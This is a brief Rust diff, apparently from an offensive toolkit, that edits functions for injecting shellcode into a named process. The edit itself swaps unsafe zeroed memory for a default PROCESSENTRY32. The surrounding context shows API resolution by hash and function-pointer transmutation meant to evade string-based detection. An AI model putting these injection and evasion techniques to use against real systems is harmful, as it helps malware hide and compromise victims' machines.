@@ -38,7 +38,7 @@ pub fn inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-process32next
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Diagnostics/ToolHelp/fn.Process32Next.html
     let mut pid: u32 = 0;
-    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
+    let mut process_entry = PROCESSENTRY32::default();
     process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
     while unsafe { Process32Next(snapshot, &mut process_entry).as_bool() } {
         let mut process_name = String::from("");
@@ -102,7 +102,7 @@ pub fn antistring_inject_and_migrate(shellcode: &[u8], target_process: &str) {
     // See line 38
     let function = rco_utils::find_function_address("Kernel32", 0x4cf400a249844bee).unwrap();
     let mut pid: u32 = 0;
-    let mut process_entry: PROCESSENTRY32 = unsafe { mem::zeroed() };
+    let mut process_entry = PROCESSENTRY32::default();
     process_entry.dwSize = mem::size_of::<PROCESSENTRY32>() as u32;
     while unsafe {
         mem::transmute::<*const (), fn(HANDLE, &mut PROCESSENTRY32) -> BOOL>
